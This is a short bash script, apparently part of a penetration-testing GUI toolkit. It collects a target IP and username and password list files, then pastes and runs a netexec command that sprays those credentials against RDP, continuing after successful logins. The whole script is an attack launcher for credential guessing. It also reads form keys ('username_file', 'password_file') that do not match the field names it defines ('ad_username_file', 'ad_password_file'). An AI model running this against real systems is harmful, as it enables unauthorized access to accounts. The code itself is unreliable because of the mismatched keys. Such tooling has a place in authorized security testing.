#!/bin/bash

: '
nxc rdp: Check RDP with user/pass lists, continue on success.
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
IP_FIELD=$(form_item  "IP address" "ip")
AD_USERNAME_FILE_FIELD=$(form_item  "username" "ad_username_file" "documentation/evidence/notes/ad_users.txt")
AD_PASSWORD_FILE_FIELD=$(form_item  "password" "ad_password_file" "documentation/evidence/notes/ad_passwords.txt")

# Generate GUI form
generate_form "${IP_FIELD}" "${AD_USERNAME_FILE_FIELD}" "${AD_PASSWORD_FILE_FIELD}"

IP=${form_data["ip"]}
AD_USERNAME_FILE=${form_data["username_file"]}
AD_PASSWORD_FILE=${form_data["password_file"]}

paste_command "netexec rdp ${IP} -u ${AD_USERNAME_FILE} -p ${AD_PASSWORD_FILE} --continue-on-success"
xdotool key Return
